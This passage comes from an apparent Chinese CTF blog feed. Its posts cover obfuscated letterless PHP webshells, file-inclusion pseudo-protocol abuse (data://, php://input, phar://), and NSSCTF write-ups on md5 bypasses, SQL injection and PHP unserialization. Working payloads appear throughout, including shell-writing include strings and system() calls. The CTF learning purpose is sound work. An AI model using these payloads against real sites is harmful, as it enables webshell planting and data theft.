class=\"comment\">// S</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// E </span></span><br><span class=\"line\"><span class=\"variable\">$___</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// R</span></span><br><span class=\"line\"><span class=\"variable\">$___</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// T</span></span><br><span class=\"line\"><span class=\"variable\">$___</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$____</span>=<span class=\"string\">&#x27;_&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// P</span></span><br><span class=\"line\"><span class=\"variable\">$____</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// O</span></span><br><span class=\"line\"><span class=\"variable\">$____</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// S</span></span><br><span class=\"line\"><span class=\"variable\">$____</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// T</span></span><br><span class=\"line\"><span class=\"variable\">$____</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$_</span>=<span class=\"variable\">$$____</span>;</span><br><span class=\"line\"><span class=\"variable\">$___</span>(<span class=\"variable\">$_</span>[_]); <span class=\"comment\">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>\n<p><mark>注意</mark><br>\n由于有很多不可见字符，我们要把它们放到一排后 url 编码才能用</p>\n<h1 id=\"php5与php7的区别\"><a class=\"markdownIt-Anchor\" href=\"#php5与php7的区别\">#</a> php5 与 php7 的区别</h1>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php5:</span><br><span class=\"line\">$f=&#x27;assert&#x27;;$f($_POST[1]);</span><br><span class=\"line\">post: 1=phpinfo();</span><br><span class=\"line\"></span><br><span class=\"line\">php7:</span><br><span class=\"line\">($f)()方法调用函数</span><br><span class=\"line\">eg.</span><br><span class=\"line\">(call_user_func)(system,whoami,&#x27;&#x27;)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>因此 php7 可以取反直接用，就像上面第一个方法一样</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(call_user_func)(system,whoami,&#x27;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,&#x27;&#x27;);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "url": "https://hq185187.github.io/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "title": "文件包含及伪协议的使用",
            "date_published": "2023-04-26T10:30:05.193Z",
            "content_html": "<h1 id=\"原因\"><a class=\"markdownIt-Anchor\" href=\"#原因\">#</a> 原因</h1>\n<p>四个函数:include (),include_once (),require (),require_once ()<br>\n 只要文件内容符合 PHP 语法规范，那么任何扩展名都可以被 PHP 解析。比如把 <code>&lt;?php phpinfo();?&gt;</code>  文件名改为 phpinfo.txt 还是可以看到信息<br>\n包含非 PHP 语法规范源文件时，将会暴露其源代码</p>\n<h1 id=\"伪协议\"><a class=\"markdownIt-Anchor\" href=\"#伪协议\">#</a> 伪协议</h1>\n<h2 id=\"1data协议\"><a class=\"markdownIt-Anchor\" href=\"#1data协议\">#</a> 1.data 协议</h2>\n<p>这是一种数据流封装器，用法: <code>data://text/plain,&lt;?php system('whoami')?&gt;</code> <br>\n <code>data://text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==</code></p>\n<h2 id=\"2php协议\"><a class=\"markdownIt-Anchor\" href=\"#2php协议\">#</a> 2.php:// 协议</h2>\n<p>访问各个输入输出流</p>\n<h3 id=\"1phpinput\"><a class=\"markdownIt-Anchor\" href=\"#1phpinput\">#</a> (1)php://input</h3>\n<p>用来接收 POST 数据<br>\n eg1. 增加一句话</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php:input</span><br><span class=\"line\">post传参:</span><br><span class=\"line\">&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;a&quot;),&quot;&lt;?php phpinfo.php();?&gt;&quot;)?&gt;</span><br></pre></td></tr></table></figure>\n<p>eg2. 增加文件<br>\n post 部分改为:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php phpinfo.php();?&gt;&quot;)?&gt;</span><br></pre></td></tr></table></figure>\n<p>eg3. 执行系统命令<br>\n post 为:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2phpfilter\"><a class=\"markdownIt-Anchor\" href=\"#2phpfilter\">#</a> (2)php://filter</h2>\n<p>这个语句用来查看源码。直接包含 php 文件时会被解析，不能看到源码，所以用 filter 来读取，不过要先 base64 加密传输过来<br>\n eg.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php://filter/read=convert.base64-encode/resource=C:\\oneword</span><br></pre></td></tr></table></figure>\n<p>还有一些可参考 php 手册</p>\n<h2 id=\"3file协议\"><a class=\"markdownIt-Anchor\" href=\"#3file协议\">#</a> 3.file:// 协议</h2>\n<p>访问本地文件系统<br>\n eg</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file:///D:/phpstudy_pro/WWW/index.html</span><br><span class=\"line\"></span><br><span class=\"line\">file://D:\\phpstudy_pro\\WWW\\index.html</span><br></pre></td></tr></table></figure>\n<p>看个例子:</p>\n<p>![[Pasted image 20230425131935.png]]<br>\n![[Pasted image 20230425132653.png]]<br>\n 前面说过后缀名不是 php 但是文件内容符合 php 结构的也可以当作 php 解析，这就是 include 函数</p>\n<h2 id=\"4zip协议\"><a class=\"markdownIt-Anchor\" href=\"#4zip协议\">#</a> 4.zip 协议</h2>\n<p>zip:// 本来是用来访问压缩包里的文件。当它与包含函数结合时，zip:// 流就会被当作 php 文件执行</p>\n<p>规则:</p>\n<ol>\n<li>zip:// 中只能传入绝对路径</li>\n<li>要用 #分隔压缩包和压缩包里的内容，并且 #要用 url 编码 %23</li>\n<li>只需要是 zip 的压缩包就行，后缀名可以任意改<br>\n eg 直接用 zip 协议</li>\n</ol>\n<p>![[Pasted image 20230425141324.png]]</p>\n<p>改成 zip.jpg 后<br>\n！[[Pasted image 20230425141432.png]]</p>\n<ul>\n<li>bzip2,zlib 一样就是绝对路径和相对路径都能用</li>\n</ul>\n<h2 id=\"5phar协议\"><a class=\"markdownIt-Anchor\" href=\"#5phar协议\">#</a> 5.phar 协议</h2>\n<ul>\n<li>phar:// 有点类似 zip:// 同样可以导致 任意代码执行。</li>\n<li>可以用相对路径和绝对路径<br>\n poc:</li>\n<li><code>?file=phar://zip.jpg/phpinfo.txt</code></li>\n<li><code>?file=phar://D:\\zip.jpg\\phpinfo.txt</code></li>\n<li>可以配合文件上传漏洞:<br>\n 假如文件上传限制 MIME, 把木马文件压缩成 zip, 再该后缀名为 jpg, 直接 phar 协议执行</li>\n</ul>\n<h1 id=\"绕过\"><a class=\"markdownIt-Anchor\" href=\"#绕过\">#</a> 绕过</h1>\n<h2 id=\"1指定后缀名\"><a class=\"markdownIt-Anchor\" href=\"#1指定后缀名\">#</a> 1. 指定后缀名</h2>\n<p>eg</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\terror_reporting(0);</span><br><span class=\"line\">\t$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">\t//后缀</span><br><span class=\"line\">\tinclude $file.&quot;.txt&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">\thighlight_file(__FILE__);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<ol>\n<li>%00 截断</li>\n<li>长度绕过，一直././././././././,Windows 超过 256 后面丢弃，Linux4096</li>\n<li>url 绕过:<br>\n <code>url:protocol :// hostname[:port] / path / [;parameters][?query]#fragment </code> <br>\n(1).query<br>\npayload: <code>http://127.0.0.1/phpinfo.php?</code> <br>\n 拼接后: <code>http://127.0.0.1/phpinfo.php?.txt</code> <br>\n(2)fragment<br>\npayload: <code>http://127.0.0.1/phpinfo.php%23</code> <br>\n 拼接后: <code>http://127.0.0.1/phpinfo.php#.txt</code></li>\n</ol>\n<h2 id=\"2编码\"><a class=\"markdownIt-Anchor\" href=\"#2编码\">#</a> 2. 编码</h2>\n<h3 id=\"1\"><a class=\"markdownIt-Anchor\" href=\"#1\">#</a> 1.  …/</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.url编码</span><br><span class=\"line\">%2e%2e%2f</span><br><span class=\"line\">..%2f</span><br><span class=\"line\">%2e%2e/</span><br><span class=\"line\">2.二次编码</span><br><span class=\"line\">%252e%252e%252f</span><br><span class=\"line\">3.容器和服务器编码</span><br><span class=\"line\">..%c0%af</span><br></pre></td></tr></table></figure>\n<p>参考:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4L2FydGljbGUvZGV0YWlscy84NzA5MDUzOQ==\">(122 条消息) CTF 中文件包含漏洞总结_LetheSec 的博客 - CSDN 博客</span></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/26/nessctf/",
            "url": "https://hq185187.github.io/2023/04/26/nessctf/",
            "title": "NSSCTF1",
            "date_published": "2023-04-25T16:51:04.501Z",
            "content_html": "<h3 id=\"1easy_md5\"><a class=\"markdownIt-Anchor\" href=\"#1easy_md5\">#</a> 1.easy_md5</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;?php     highlight_file(__FILE__);    include &#x27;flag2.php&#x27;;       if (isset($_GET[&#x27;name&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123;    $name = $_GET[&#x27;name&#x27;];    $password = $_POST[&#x27;password&#x27;];       if ($name != $password &amp;&amp; md5($name) == md5($password))&#123;           echo $flag;       &#125;       else &#123;           echo &quot;wrong!&quot;;       &#125;       &#125;   else &#123;       echo &#x27;wrong!&#x27;;   &#125;   ?&gt;`</span><br></pre></td></tr></table></figure>\n<p>md5 弱类型比较<br>\n (1).0e 绕过<br>\n以下是一些字符串 md5 值以 0e 开头<br>\n QNKCDZO<br>\n240610708<br>\ns878926199a<br>\ns155964671a<br>\ns21587387a</p>\n<p>(2). 数组绕过<br>\n md5 () 函数计算的是一个字符串的哈希值，对于数组则返回 false<br>\n <code>payload:?a[]=1&amp;b[]=2</code></p>\n<h3 id=\"2caidao\"><a class=\"markdownIt-Anchor\" href=\"#2caidao\">#</a> 2.caidao</h3>\n<p>(1) antsword 连<br>\n (2) hackbar 传参:`wllm=system (‘cat …/…/…/flag’);</p>\n<h3 id=\"3include\"><a class=\"markdownIt-Anchor\" href=\"#3include\">#</a> 3.include</h3>\n<p>(1) filter 伪协议</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p>这题用 file 协议也可以但是没有得到 flag<br>\n 可以这样:?file= <code>file:///etc/passwd</code> <br>\n 但是 <code>?file=file:///var/www/flag.php</code>  不行<br>\n<strong>想深刻了解伪协议的来这里</strong></p>\n<h3 id=\"4ezrce\"><a class=\"markdownIt-Anchor\" href=\"#4ezrce\">#</a> 4.ezrce</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;?php   error_reporting(0);   highlight_file(__FILE__);   if(isset($_GET[&#x27;url&#x27;]))   &#123;   eval($_GET[&#x27;url&#x27;]);   &#125;`</span><br></pre></td></tr></table></figure>\n<p>学习 Linux 命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls / 列出根目录(\\)下的所有目录</span><br><span class=\"line\">发现flag文件在root根目录下,cat /flllllllag来cat根目录下的flag文件</span><br></pre></td></tr></table></figure>\n<p><strong>深刻了解 Linux 命令来这里</strong></p>\n<h3 id=\"5easysql-suctf2019\"><a class=\"markdownIt-Anchor\" href=\"#5easysql-suctf2019\">#</a> 5.EasySQL SUCTF2019</h3>\n<p>fuzz:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; or 1=1--+</span><br><span class=\"line\">1&#x27; order by 3--+</span><br><span class=\"line\">1&#x27; and updatexml(1,concat(0x7e,database()),1)--+</span><br><span class=\"line\">1&#x27; and if(length(database())&gt;1,sleep(5),1)--+</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>堆叠注入:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1;show databases#</span><br><span class=\"line\">1;show tables#</span><br><span class=\"line\">这两个还可以</span><br><span class=\"line\">1;show columns from &#x27;Flag&#x27;#</span><br><span class=\"line\">失败</span><br></pre></td></tr></table></figure>\n<p>它的 SQL 查询语句是:<br>\n <code>select $_POST['query']||flag from Flag</code> <br>\n 说真的我猜不出来<br>\n当 sql_mode 设置了 PIPES_AS_CONCAT 时，|| 是字符串连接符，相当于 concat () 函数</p>\n<p><code>payload1:*,1</code> <br>\nsql: <code>select *,1||flag from Flag</code> , 这样查询出了 Flag 表的所有内容<br>\n此处的 1 是临时增加一列，列名为 1||flag 且这一列的所有值都为 1</p>\n<p>payload2: <code>1;set sql_mode=PIPES_AS_CONCAT;select 1 sql:</code> select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</p>\n<p>返回一个列名为 1||flag, 列元素为 1flag 的值的表</p>\n<h3 id=\"6zjctf-2019nizhuansiwei\"><a class=\"markdownIt-Anchor\" href=\"#6zjctf-2019nizhuansiwei\">#</a> 6.[ZJCTF 2019]NiZhuanSiWei</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$text = $_GET[&quot;text&quot;];</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">$password = $_GET[&quot;password&quot;];</span><br><span class=\"line\">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class=\"line\">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class=\"line\">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class=\"line\">        echo &quot;Not now!&quot;;</span><br><span class=\"line\">        exit(); </span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        include($file);  //useless.php</span><br><span class=\"line\">        $password = unserialize($password);</span><br><span class=\"line\">        echo $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>第一步：绕过 file_get_contents<br>\n(1)php://input<br>\n?text=php://input<br>\npost 传参: <code>welcome to the zjctf</code> <br>\n (2) data 协议<br>\n <code>?text=data://text/plain,welcome to the zjctf</code> <br>\n 根据提示的 useless.php 可以发现可以用伪协议读取<br>\n <code>file=php://filter/read=convert.base64-encode/resource=useless.php</code> <br>\n 第一步:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=file=php://input&amp;&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br><span class=\"line\"></span><br><span class=\"line\">post传参:welcome to the zjct</span><br></pre></td></tr></table></figure>\n<p>经过 base64 解码得到 useless.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\"></span><br><span class=\"line\">class Flag&#123;  //flag.php  </span><br><span class=\"line\">    public $file;  </span><br><span class=\"line\">    public function __tostring()&#123;  </span><br><span class=\"line\">        if(isset($this-&gt;file))&#123;  </span><br><span class=\"line\">            echo file_get_contents($this-&gt;file); </span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">?&gt;  </span><br></pre></td></tr></table></figure>\n<p>注意 tostring 魔术方法在对象被当作字符串处理时会调用，index 里就是 echo</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Flag&#123;    </span><br><span class=\"line\">    public $file=&#x27;flag.php&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$p=new Flag();</span><br><span class=\"line\">echo urlencode(serialize($p));</span><br><span class=\"line\">?&gt;  </span><br><span class=\"line\"></span><br><span class=\"line\">O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></pre></td></tr></table></figure>\n<p>`<br>\n 最终 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=file=php://input&amp;&amp;file=useless.php&amp;&amp;password=</span><br><span class=\"line\">O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br><span class=\"line\"></span><br><span class=\"line\">post传参:welcome to the zjct</span><br></pre></td></tr></table></figure>\n<p>检查可发现源代码注释部分有 flag</p>\n<h3 id=\"7easy_md5\"><a class=\"markdownIt-Anchor\" href=\"#7easy_md5\">#</a> 7.easy_md5</h3>\n<p>F12-&gt; 网络 -&gt; 请求头 -&gt;hint</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$password</span>,<span class=\"literal\">true</span>).<span class=\"string\">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content: ffifdyop</span><br><span class=\"line\">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class=\"line\">raw: &#x27;or&#x27;6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c</span><br><span class=\"line\">string: &#x27;or&#x27;6]!r,b</span><br></pre></td></tr></table></figure>\n<p>注意:<br>\n <code>\\和后面三个字符算一个字符</code> <br>\n sql:``select * from admin where username=‘admin’ and password=’&quot;‘or’6]!r,b&quot;’;</p>\n<p>在 mysql 里面，在用作布尔型判断时，以 1 开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如 password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于 password=‘xxx’ or 1  ，也就相当于 password=‘xxx’ or true，所以返回值就是 true</p>\n<p>关键是:<mark>’ or 1’</mark><br>\n答案肯定不止一个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content: 129581926211651571912466741651878684928</span><br><span class=\"line\">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class=\"line\">raw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1&#x27;or&#x27;8</span><br><span class=\"line\">string: T0Do#&#x27;or&#x27;8</span><br></pre></td></tr></table></figure>\n<p>复现:<br>\n![[Pasted image 20230425192651.png]]</p>\n<p>然后就是常规的数组绕过，0e 绕过了</p>\n<h3 id=\"8swpuctf-2021-新生赛hardrce\"><a class=\"markdownIt-Anchor\" href=\"#8swpuctf-2021-新生赛hardrce\">#</a> 8.[SWPUCTF 2021 新生赛] hardrce</h3>\n<h4 id=\"无字母rce\"><a class=\"markdownIt-Anchor\" href=\"#无字母rce\">#</a> 无字母 rce</h4>\n<ol>\n<li>system () 函数</li>\n</ol>\n<ul>\n<li>执行外部程序并显示输出资料</li>\n</ul>\n<ol start=\"2\">\n<li>eval () 函数</li>\n</ol>\n<ul>\n<li>把字符串当 php 代码执行，必须以；结尾</li>\n</ul>\n<ol start=\"3\">\n<li>php 的取反问题～<br>\n 此题过滤了很多黑名单，根据题目提示是无字母 rce 想到了～</li>\n</ol>\n<ul>\n<li>对于数字取反的规则可以看看这篇:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1dpbGxpYW1zV2F5bmUvYXJ0aWNsZS9kZXRhaWxzLzc4MjU5NTAx\">https://blog.csdn.net/WilliamsWayne/article/details/78259501</span></li>\n<li>对于字符取反，由于有大量的不可显字符，要 url 